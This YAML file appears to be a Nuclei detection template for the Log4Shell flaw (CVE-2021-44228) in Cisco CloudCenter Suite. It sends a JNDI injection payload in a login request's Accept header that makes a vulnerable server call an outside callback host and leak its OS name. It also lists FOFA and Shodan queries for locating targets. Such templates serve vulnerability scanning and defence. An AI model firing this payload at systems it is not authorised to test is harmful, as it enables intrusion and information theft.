id: cisco-cloudcenter-suite-log4j-rce
info:
  name: Cisco CloudCenter Suite (Log4j)- Remote Code Execution
  author: pwnhxl
  severity: critical
  description: Cisco CloudCenter Suite is vulnerable to remote code execution via
    the Apache Log4j library, enabling attackers to execute malicious code, access
    sensitive information, and gain full control over compromised systems without
    proper credentials.
  reference:
  - https://logging.apache.org/log4j/2.x/security.html
  - http://www.openwall.com/lists/oss-security/2021/12/10/1
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  remediation: From log4j 2.15.0, this behavior has been disabled by default. From
    version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has
    been completely removed. Note that this vulnerability is specific to log4j-core
    and does not affect log4net, log4cxx, or other Apache Logging Services projects.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    fofa-query: title="CloudCenter Suite"
    shodan-query: title:"CloudCenter Suite"
    impact: The vulnerability in Cisco CloudCenter Suite (Log4j) could lead to devastating
      impacts such as unauthorized data access, malware execution, and complete control
      over compromised systems.
    recommendation: Upgrade your Cisco CloudCenter Suite to a version that includes
      the security releases 2.12.2, 2.12.3, and 2.3.1 to protect against remote code
      execution via the Apache Log4j library.
  tags: cve,cve2021,jndi,log4j,rce,oast,cloudcenter,cisco,kev
requests:
- raw:
  - '@timeout: 10s

    POST /suite-auth/login HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */${jndi:ldap://${sys:os.name}.{{interactsh-url}}}

    Content-Type: application/json


    {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  - type: word
    part: header
    words:
    - X-RateLimit-Limit-suite-gateway_suite-auth
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
